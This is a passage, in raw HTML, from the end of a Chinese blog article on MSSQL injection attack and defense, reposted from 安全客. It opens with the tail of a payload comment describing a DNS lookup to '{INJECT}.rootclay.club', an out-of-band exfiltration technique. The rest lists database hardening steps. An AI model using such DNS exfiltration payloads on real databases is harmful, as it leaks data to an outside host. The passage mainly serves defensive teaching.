68);">')
Makes&nbsp;DNS&nbsp;resolution&nbsp;request&nbsp;to&nbsp;{INJECT}.rootclay.club</span></span></code></pre><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-weight: bolder;font-size:14px;line-height:34px;;">防御</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;">1. 设置TRUSTWORTHY为offALTER DATABASE master SET TRUSTWORTHY OFF</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;">2. 确保你的存储过程的权限不是sysadmin权限的</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;">3. 对于 PUBLIC用户是不能给存储过程权限的REVOKE EXECUTE ON 存储过程 to PUBLIC</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;">4. 对于自己不需要的存储过程最好删除</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;">5. 当然,在代码方面就做好防御是最好的选择,可以参见上篇文章</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;"><strong style="color: rgb(51, 51, 51);font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;text-align: justify;white-space: normal;background-color: rgb(255, 255, 255);font-size:15px;line-height:35px;;"><span style="font-size:14px;line-height:34px;;color: rgb(136, 136, 136);font family: &quot;Lucida Grande&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, Verdana, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, STHeiti, &quot;Microsoft YaHei&quot;, &quot;WenQuanYi Zen Hei&quot;, &quot;WenQuanYi Micro Hei&quot;, &quot;Noto Sans CJK SC&quot;, &quot;Source Han Sans CN&quot;, SimSun, sans-serif;white-space: pre-wrap;"><strong style="color: rgb(255, 104, 39);font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;text-align: center;white-space: normal;"><img data-type="png" class="" data-ratio="0.109375" data-w="640" data-backw="501" data-backh="54" data-before-oversubscription-url="https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png" src="图片/HACK学习呀_2018-12-10_干货MSSQL注入攻击与防御/15_rsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png'" style="letter-spacing: 0.544px;color: rgb(51, 51, 51);font-size:17px;line-height:37px;;text-align: justify;font family: -apple-system-font, system-ui, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;visibility: visible !important;width: 639.6px !important;"  /></strong></span></strong></span></p><p style="text-align: right;"><span style="font-size:11px;line-height:31px;;color: rgb(136, 136, 136);">来源：安全客</span></p><p style="text-align: right;"><span style="font-size:11px;line-height:31px;;color: rgb(136, 136, 136);">作者：rootclay</span></p><p><img class="" data-copyright="0" data-ratio="0.3281027104136947" data-s="300,640" src="图片/HACK学习呀_2018-12-10_干货MSSQL注入攻击与防御/16_9kZ6Bzp6HKPIkCGYkfBsPynR63cBgg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou85etJYTkncLGY4Biavb6ibNajxPOSFB9UFWD40tY4uCrHqy59kZ6Bzp6HKPIkCGYkfBsPynR63cBgg/640?wx_fmt=png'" data-type="png" data-w="701" style=""  /></p><p><br  /></p>
                </div>
</div>
</body>
</html>